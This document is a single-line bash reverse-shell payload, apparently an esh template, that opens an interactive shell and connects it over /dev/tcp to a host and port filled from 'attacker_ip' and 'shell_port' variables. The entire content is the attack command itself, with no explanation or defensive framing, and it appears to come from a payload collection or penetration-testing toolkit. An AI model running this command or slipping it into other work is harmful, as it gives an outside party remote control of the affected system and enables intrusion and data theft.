bash -c "bash -i >& /dev/tcp/<%=$(esh variables/attacker_ip)%>/<%=$(esh variables/shell_port)%> 0>&1"
